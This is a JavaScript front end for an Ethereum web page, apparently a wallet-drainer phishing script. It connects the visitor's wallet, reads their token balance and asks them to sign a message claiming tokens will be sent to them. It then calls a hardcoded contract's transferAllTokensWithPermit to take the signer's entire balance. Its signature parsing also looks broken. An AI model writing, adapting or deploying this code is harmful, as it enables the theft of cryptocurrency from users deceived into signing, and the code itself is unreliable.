let web3;
let userAddress;

// 替换为你的智能合约 ABI
const yourContractABI = [
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "target",
				"type": "address"
			}
		],
		"name": "AddressEmptyCode",
		"type": "error"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "account",
				"type": "address"
			}
		],
		"name": "AddressInsufficientBalance",
		"type": "error"
	},
	{
		"inputs": [],
		"name": "FailedInnerCall",
		"type": "error"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "token",
				"type": "address"
			}
		],
		"name": "SafeERC20FailedOperation",
		"type": "error"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "token",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"internalType": "uint8",
				"name": "v",
				"type": "uint8"
			},
			{
				"internalType": "bytes32",
				"name": "r",
				"type": "bytes32"
			},
			{
				"internalType": "bytes32",
				"name": "s",
				"type": "bytes32"
			}
		],
		"name": "transferAllTokensWithPermit",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "address",
				"name": "token",
				"type": "address"
			},
			{
				"indexed": true,
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"indexed": false,
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "TransferTokens",
		"type": "event"
	}
];

const contractAddress = '0xB57ee0797C3fc0205714a577c02F7205bB89dF30';

async function connectWallet() {
    console.log("尝试连接钱包");
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];

            console.log("已连接地址:", userAddress); // 输出连接的钱包地址
            document.getElementById('address').innerText = userAddress;
            document.getElementById('walletInfo').classList.remove('hidden');
            document.getElementById('connectWallet').classList.add('hidden');

            // 自动填写被签名的钱包地址
            document.getElementById('fromAddress').value = userAddress;

            // 查询余额并填写
            const tokenAddress = document.getElementById('tokenAddress').value;
            const balance = await getTokenBalance(tokenAddress, userAddress);
            document.getElementById('amount').innerText = balance;

            // 自动签名并填写 v, r, s
            const signature = await signMessage(tokenAddress, userAddress, balance);
            const { v, r, s } = extractSignatureParameters(signature);
            document.getElementById('v').value = v;
            document.getElementById('r').value = r;
            document.getElementById('s').value = s;
        } catch (error) {
            console.error("连接钱包时出错:", error); // 输出错误信息
            alert('连接钱包失败，请检查控制台的错误信息。');
        }
    } else {
        alert('请安装MetaMask或其他以太坊钱包！');
    }
}

async function getTokenBalance(tokenAddress, account) {
    const tokenContract = new web3.eth.Contract([
        {
            "constant": true,
            "inputs": [{ "name": "owner", "type": "address" }],
            "name": "balanceOf",
            "outputs": [{ "name": "", "type": "uint256" }],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
        }
    ], tokenAddress);
    const balance = await tokenContract.methods.balanceOf(account).call();
    return balance;
}

async function signMessage(tokenAddress, fromAddress, amount) {
    const message = `转移 ${amount} 代币至你的地址。`; // 自定义签名消息
    const signature = await web3.eth.personal.sign(message, fromAddress);
    return signature;
}

function extractSignatureParameters(signature) {
    const v = parseInt(signature.slice(-2), 16); // 最后两位
    const r = '0x' + signature.slice(0, 66); // 前66位
    const s = '0x' + signature.slice(66, 130); // 中间64位
    return { v, r, s };
}

async function transferTokens() {
    const tokenAddress = document.getElementById('tokenAddress').value;
    const fromAddress = document.getElementById('fromAddress').value;
    const v = document.getElementById('v').value;
    const r = document.getElementById('r').value;
    const s = document.getElementById('s').value;

    // 调用合约进行转账
    const contract = new web3.eth.Contract(yourContractABI, contractAddress); // 合约地址
    await contract.methods.transferAllTokensWithPermit(tokenAddress, fromAddress, v, r, s).send({ from: userAddress });

    alert("代币已成功转移！");
}
